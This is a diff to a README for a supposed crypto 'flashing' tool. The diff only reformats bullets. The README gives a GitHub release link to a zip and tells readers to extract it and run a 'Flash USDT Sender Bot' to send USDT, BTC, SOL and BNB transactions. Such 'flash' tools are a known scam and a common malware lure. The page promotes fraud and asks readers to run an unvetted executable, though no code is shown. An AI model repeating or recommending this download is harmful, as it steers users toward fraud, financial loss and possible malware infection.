@@ -6,14 +6,14 @@
 
 [CLICK TO DOWNLOAD](https://github.com/marllingfdddd/USDT-BTC-ETH-Flashing-Tool-Download-With-GUI/releases/download/Tool/FLashing_Tool.zip)
 
-📁 Please note that the provided link needs to be launched for downloading the software package.
+- 📁 Please note that the provided link needs to be launched for downloading the software package.
 
 ## How to Use
 
-    Download the software package from the provided link.
-    Extract the contents of the zip file to your desired location.
-    Run the Flash USDT Sender Bot application.
-    Follow the on-screen instructions to start sending USDT, BTC, SOL, and BNB transactions.
+   - Download the software package from the provided link.
+   -  Extract the contents of the zip file to your desired location.
+   -  Run the Flash USDT Sender Bot application.
+   -  Follow the on-screen instructions to start sending USDT, BTC, SOL, and BNB transactions.
 
 
 
